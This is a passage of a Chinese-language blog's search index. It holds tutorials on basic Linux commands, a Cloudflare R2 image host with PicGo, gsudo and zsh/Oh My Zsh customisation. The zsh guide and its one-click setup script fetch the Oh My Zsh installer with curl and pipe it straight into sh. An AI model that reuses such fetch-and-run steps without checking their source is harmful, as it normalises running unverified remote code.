class="language-bash"><span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>top</strong>：实时显示系统性能信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">top</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>ps</strong>：显示当前进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span><span class="token function">ps</span> aux  <span class="token comment"># 显示所有进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>kill</strong>：终止进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">kill</span> PID<span class="token function">kill</span> <span class="token parameter variable">-9</span> PID  <span class="token comment"># 强制终止进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>chmod</strong>：更改文件权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">755</span> filename<span class="token function">chmod</span> +x filename  <span class="token comment"># 使文件可执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>chown</strong>：更改文件所有者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> user:group filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><ul><li><p><strong>ping</strong>：测试网络连通性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>curl</strong>：发送网络请求</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>wget</strong>：下载文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://example.com/file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="管道和重定向"><a href="#管道和重定向" class="headerlink" title="管道和重定向"></a>管道和重定向</h3><ul><li><p>**|**：管道，将一个命令的输出作为另一个命令的输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"pattern"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**&gt;**：重定向输出到文件（覆盖）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Hello, World!"</span> <span class="token operator">&gt;</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**&gt;&gt;**：重定向输出到文件（追加）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Hello, World!"</span> <span class="token operator">&gt;&gt;</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**&lt;**：重定向输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&lt;</span> inputfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li><p>设置变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">MY_VAR</span><span class="token operator">=</span><span class="token string">"Hello, World!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable">$MY_VAR</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="Shell-脚本"><a href="#Shell-脚本" class="headerlink" title="Shell 脚本"></a>Shell 脚本</h2><p>Shell 脚本是一组 Shell 命令的集合，通常用于自动化任务。以下是一个简单的 Shell 脚本示例：</p><h3 id="创建脚本文件"><a href="#创建脚本文件" class="headerlink" title="创建脚本文件"></a>创建脚本文件</h3><p>使用你喜欢的文本编辑器创建一个脚本文件，例如 <code>myscript.sh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> myscript.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><p>在脚本文件中编写以下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># 打印消息</span><span class="token builtin class-name">echo</span> <span class="token string">"This is a simple shell script."</span><span class="token comment"># 设置变量</span><span class="token assign-left variable">NAME</span><span class="token operator">=</span><span class="token string">"Alice"</span><span class="token comment"># 使用变量</span><span class="token builtin class-name">echo</span> <span class="token string">"Hello, <span class="token variable">$NAME</span>!"</span><span class="token comment"># 条件语句</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$NAME</span> <span class="token operator">==</span> <span class="token string">"Alice"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">"Welcome, Alice!"</span><span class="token keyword">else</span>  <span class="token builtin class-name">echo</span> <span class="token string">"You are not Alice."</span><span class="token keyword">fi</span><span class="token comment"># 循环</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">do</span>  <span class="token builtin class-name">echo</span> <span class="token string">"Number: <span class="token variable">$i</span>"</span><span class="token keyword">done</span><span class="token comment"># 函数</span><span class="token function-name function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token builtin class-name">echo</span> <span class="token string">"This is a function."</span><span class="token punctuation">}</span><span class="token comment"># 调用函数</span>my_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>首先使脚本可执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x myscript.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后运行脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./myscript.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用cloudflare的R2创建图床</title>
      <link href="/2024/07/27/shi-yong-cloudflare-de-r2-chuang-jian-tu-chuang/"/>
      <url>/2024/07/27/shi-yong-cloudflare-de-r2-chuang-jian-tu-chuang/</url>
      
        <content type="html"><![CDATA[<h1 id="使用cloudflare的R2创建图床"><a href="#使用cloudflare的R2创建图床" class="headerlink" title="使用cloudflare的R2创建图床"></a>使用cloudflare的R2创建图床</h1><h2 id="创建存储桶"><a href="#创建存储桶" class="headerlink" title="创建存储桶"></a>创建存储桶</h2><p>首先有一个cloudflare账号并且成功开通R2服务</p><p>依次点击R2-&gt;创建存储桶</p><p><img src="https://images.dadream.eu.org/images/2024/07/8c361d6ac6f76ad87da98ce758a4261a.png"></p><p>进入创建的桶，点击设置，下滑点击连接到域，example.com为你在cloudflare上托管的域名，会自动添加记录</p><p><img src="https://images.dadream.eu.org/images/2024/07/e02d80f0f528eb474a327a3ee2aac1cc.png"></p><p>等待初始化成功就可以上传图片了并通过url访问了</p><p><img src="https://images.dadream.eu.org/images/2024/07/592642fec58d64822ca9dd28855095c9.png"></p><p>上传图片后点进去就能看到url</p><p><img src="https://images.dadream.eu.org/images/2024/07/33de127f3053a3537919fae0a5b35c61.png"></p><h2 id="安装PicGo"><a href="#安装PicGo" class="headerlink" title="安装PicGo"></a>安装PicGo</h2><p>这个用于管理图片上传和浏览</p><p>github仓库地址<a href="https://github.com/Molunerfinn/PicGo">Releases · Molunerfinn/PicGo (github.com)</a>下载安装</p><p>要先下载node.js环境，看往期文章</p><p>完成后打开软件进入插件搜索<code>S3</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/9db03c02e835473d6d06852a17c625b4.png"></p><p>配置picgo</p><p>先创建API令牌</p><p><img src="https://images.dadream.eu.org/images/2024/07/658d705739daffbba58141c804c382d5.png"></p><p>然后像这样设置，创建完成记得保存密钥</p><p><img src="https://images.dadream.eu.org/images/2024/07/3532bc2477a125fef6ac1db367b602d0.png"></p><p>保存密钥后关闭</p><p><img src="https://images.dadream.eu.org/images/2024/07/5d17e288bc348b17904a78a2b0d48ae0.png"></p><p>打开软件，+号添加配置</p><p><img src="https://images.dadream.eu.org/images/2024/07/22d21e489a73ad311ebd53ec422faee8.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/3ca6c26f83e255df9dce765281e8a034.png"></p><p>找到这个S3API</p><p>如下填写</p><p><img src="https://images.dadream.eu.org/images/2024/07/e2d3e9e11a19b0a3e1e2c6a7538ee923.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/2b5992966ed9d88fe80c8f1b8d242fac.png"></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell提权</title>
      <link href="/2024/07/27/powershell-ti-quan/"/>
      <url>/2024/07/27/powershell-ti-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="powershell提权"><a href="#powershell提权" class="headerlink" title="powershell提权"></a>powershell提权</h1><p>安装gsudo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">winget <span class="token function">install</span> gerardog.gsudo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://gerardog.github.io/gsudo/docs/install">How to Install | gsudo Documentation (gerardog.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令行输入python跳转微软商店</title>
      <link href="/2024/07/27/ming-ling-xing-shu-ru-python-tiao-zhuan-wei-ruan-shang-dian/"/>
      <url>/2024/07/27/ming-ling-xing-shu-ru-python-tiao-zhuan-wei-ruan-shang-dian/</url>
      
        <content type="html"><![CDATA[<h1 id="命令行输入python跳转微软商店"><a href="#命令行输入python跳转微软商店" class="headerlink" title="命令行输入python跳转微软商店"></a>命令行输入python跳转微软商店</h1><p>删除环境变量</p><p><img src="https://images.dadream.eu.org/images/2024/07/644f05c4b54d27b5796941ad33aea87a.png"></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux美化命令行</title>
      <link href="/2024/07/20/linux-mei-hua-ming-ling-xing/"/>
      <url>/2024/07/20/linux-mei-hua-ming-ling-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="linux美化命令行"><a href="#linux美化命令行" class="headerlink" title="linux美化命令行"></a>linux美化命令行</h1><h2 id="centos8"><a href="#centos8" class="headerlink" title="centos8"></a>centos8</h2><h3 id="安装和配置-Zsh"><a href="#安装和配置-Zsh" class="headerlink" title="安装和配置 Zsh"></a>安装和配置 Zsh</h3><p>首先，安装 Zsh：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">zsh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将默认 shell 更改为 Zsh：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chsh <span class="token parameter variable">-s</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> <span class="token function">zsh</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新登录以使更改生效，或者使用以下命令启动 Zsh：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zsh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装和配置-Oh-My-Zsh"><a href="#安装和配置-Oh-My-Zsh" class="headerlink" title="安装和配置 Oh My Zsh"></a>安装和配置 Oh My Zsh</h3><p>下载并安装 Oh My Zsh：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装并启用-Powerline"><a href="#安装并启用-Powerline" class="headerlink" title="安装并启用 Powerline"></a>安装并启用 Powerline</h3><p>安装 Powerline 及其字体支持：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> epel-release<span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> powerline powerline-fonts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编辑 <code>~/.zshrc</code> 文件以启用 Powerline：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件末尾添加以下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /usr/share/powerline/zsh/powerline.zsh <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">source</span> /usr/share/powerline/zsh/powerline.zsh<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>保存并退出，然后重新加载 <code>~/.zshrc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装并配置插件"><a href="#安装并配置插件" class="headerlink" title="安装并配置插件"></a>安装并配置插件</h3><h4 id="安装-zsh-syntax-highlighting-插件"><a href="#安装-zsh-syntax-highlighting-插件" class="headerlink" title="安装 zsh-syntax-highlighting 插件"></a>安装 zsh-syntax-highlighting 插件</h4><p>该插件提供命令语法高亮：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="安装-zsh-autosuggestions-插件"><a href="#安装-zsh-autosuggestions-插件" class="headerlink" title="安装 zsh-autosuggestions 插件"></a>安装 zsh-autosuggestions 插件</h4><p>该插件提供命令自动建议：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="安装-fzf-插件"><a href="#安装-fzf-插件" class="headerlink" title="安装 fzf 插件"></a>安装 fzf 插件</h4><p>该插件提供模糊搜索功能：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span> <span class="token number">1</span> https://github.com/junegunn/fzf.git ~/.fzf~/.fzf/install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Ctrl+R开启搜索</p><h4 id="安装-zsh-history-substring-search-插件"><a href="#安装-zsh-history-substring-search-插件" class="headerlink" title="安装 zsh-history-substring-search 插件"></a>安装 zsh-history-substring-search 插件</h4><p>该插件提供历史记录子字符串搜索：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zsh-users/zsh-history-substring-search ~/.oh-my-zsh/custom/plugins/zsh-history-substring-search<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>上箭头键（↑）</strong>：在历史记录中查找当前输入的子字符串的上一条记录</p><p><strong>下箭头键（↓）</strong>：在历史记录中查找当前输入的子字符串的下一条记录</p><h3 id="安装-z-插件"><a href="#安装-z-插件" class="headerlink" title="安装 z 插件"></a>安装 <code>z</code> 插件</h3><p>克隆 <code>z</code> 插件仓库，用于目录跳转的非常方便的工具：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/rupa/z.git /var/local/z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里不能放在<code>~</code>目录，有报错，没有目录自己创建</p><p><code>z &lt;部分目录名&gt;</code>：跳转到包含指定部分目录名的路径中访问频率最高的目录</p><p><code>z -l &lt;部分目录名&gt;</code>：列出包含指定部分目录名的所有目录，并按访问频率排序</p><p><code>z -c &lt;部分目录名&gt;</code>：列出包含指定部分目录名的所有目录，并按访问时间排序</p><h4 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h4><p>编辑 <code>~/.zshrc</code> 文件，添加并启用插件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到 <code>plugins</code> 这一行，并将其修改为如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>    <span class="token function">git</span>    zsh-syntax-highlighting    zsh-autosuggestions    zsh-history-substring-search    z<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在文件末尾添加以下内容以启用 <code>zsh-history-substring-search</code> 和 <code>fzf</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh<span class="token builtin class-name">source</span> ~/.oh-my-zsh/custom/plugins/zsh-history-substring-search/zsh-history-substring-search.zsh<span class="token builtin class-name">source</span> ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh<span class="token comment"># z 插件配置</span><span class="token builtin class-name">source</span> /var/local/z/z.sh<span class="token comment"># zsh-history-substring-search configuration</span>bindkey <span class="token string">'^[[A'</span> history-substring-search-upbindkey <span class="token string">'^[[B'</span> history-substring-search-down<span class="token comment"># fzf configuration</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> ~/.fzf.zsh <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">source</span> ~/.fzf.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存并退出，然后重新加载 <code>~/.zshrc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装并配置-Powerlevel10k-主题"><a href="#安装并配置-Powerlevel10k-主题" class="headerlink" title="安装并配置 Powerlevel10k 主题"></a>安装并配置 Powerlevel10k 主题</h3><p>Powerlevel10k 是一个高性能的 Zsh 主题，提供了丰富的美化选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/romkatv/powerlevel10k.git <span class="token variable">${ZSH_CUSTOM<span class="token operator">:-</span>~<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom}</span>/themes/powerlevel10k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑 <code>~/.zshrc</code> 文件，设置 Powerlevel10k 主题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 <code>ZSH_THEME</code> 行修改为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ZSH_THEME</span><span class="token operator">=</span><span class="token string">"powerlevel10k/powerlevel10k"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存并退出，然后重新加载 <code>~/.zshrc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一次启动时，Powerlevel10k 会引导你完成配置，选择你喜欢的配置选项即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">p10k configure <span class="token comment"># 重新配置主题</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Zsh-别名"><a href="#Zsh-别名" class="headerlink" title="Zsh 别名"></a>Zsh 别名</h4><p><strong>编辑 <code>~/.zshrc</code> 文件</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>添加常用别名</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">ll</span><span class="token operator">=</span><span class="token string">'ls -la'</span><span class="token builtin class-name">alias</span> <span class="token assign-left variable">gs</span><span class="token operator">=</span><span class="token string">'git status'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>保存并应用更改</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="一键脚本"><a href="#一键脚本" class="headerlink" title="一键脚本"></a>一键脚本</h3><p>创建文件zsh-setup.sh</p><p><code>vim zsh-setup.sh</code>，将下面代码粘贴进来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># 更新系统并安装 Zsh</span><span class="token function">sudo</span> yum update <span class="token parameter variable">-y</span><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">zsh</span><span class="token comment"># 将默认 shell 更改为 Zsh</span>chsh <span class="token parameter variable">-s</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> <span class="token function">zsh</span><span class="token variable">)</span></span><span class="token comment"># 安装 Oh My Zsh</span><span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span class="token comment"># 安装 Powerline 和字体支持</span><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> epel-release<span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> powerline powerline-fonts<span class="token comment"># 配置 Powerline</span><span class="token function">cat</span> <span class="token operator">&gt;&gt;</span> ~/.zshrc <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'if [ -f /usr/share/powerline/zsh/powerline.zsh ]; then    source /usr/share/powerline/zsh/powerline.zshfiEOF</span><span class="token comment"># 安装 zsh-syntax-highlighting 插件</span><span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<span class="token comment"># 安装 zsh-autosuggestions 插件</span><span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<span class="token comment"># 安装 fzf 插件</span><span class="token function">git</span> clone <span class="token parameter variable">--depth</span> <span class="token number">1</span> https://github.com/junegunn/fzf.git ~/.fzf~/.fzf/install <span class="token parameter variable">--all</span><span class="token comment"># 安装 zsh-history-substring-search 插件</span><span class="token function">git</span> clone https://github.com/zsh-users/zsh-history-substring-search ~/.oh-my-zsh/custom/plugins/zsh-history-substring-search<span class="token comment"># 安装 z 插件</span><span class="token function">git</span> clone https://github.com/rupa/z.git /var/local/z<span class="token comment"># 配置插件</span><span class="token function">cat</span> <span class="token operator">&gt;&gt;</span> ~/.zshrc <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'plugins=(    git    zsh-syntax-highlighting    zsh-autosuggestions    zsh-history-substring-search    z)source ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zshsource ~/.oh-my-zsh/custom/plugins/zsh-history-substring-search/zsh-history-substring-search.zshsource ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh# z 插件配置source /var/local/z/z.sh# zsh-history-substring-search configurationbindkey '^[[A' history-substring-search-upbindkey '^[[B' history-substring-search-down# fzf configuration[ -f ~/.fzf.zsh ] &amp;&amp; source ~/.fzf.zshEOF</span><span class="token comment"># 安装 Powerlevel10k 主题</span><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/romkatv/powerlevel10k.git <span class="token variable">${ZSH_CUSTOM<span class="token operator">:-</span>~<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom}</span>/themes/powerlevel10k<span class="token comment"># 配置 Powerlevel10k 主题</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/ZSH_THEME=".*"/ZSH_THEME="powerlevel10k\/powerlevel10k"/'</span> ~/.zshrc<span class="token comment"># 重新加载 Zsh 配置</span><span class="token builtin class-name">source</span> ~/.zshrc<span class="token comment"># 提示用户重新登录以使更改生效</span><span class="token builtin class-name">echo</span> <span class="token string">"Please log out and log back in to apply the changes."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>chmod +x zsh-setup.sh</code>赋予执行权限</p><p><code>./zsh-setup.sh</code>执行两次脚本，再执行<code>source ~/.zshrc</code></p><h3 id="恢复为bash"><a href="#恢复为bash" class="headerlink" title="恢复为bash"></a>恢复为bash</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span>  <span class="token comment">#查看当前命令行</span><span class="token function">which</span> <span class="token function">bash</span>  <span class="token comment"># 查看bash所在目录</span>chsh <span class="token parameter variable">-s</span> /bin/bash  <span class="token comment"># 后面目录为你上述命令执行结果，切换命令行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><p>和centos基本一致，将yum换成apt安装命令即可</p><p>一键脚本也是将yum换成apt</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSYS2教程</title>
      <link href="/2024/07/03/msys2-jiao-cheng/"/>
      <url>/2024/07/03/msys2-jiao-cheng/</url>
      
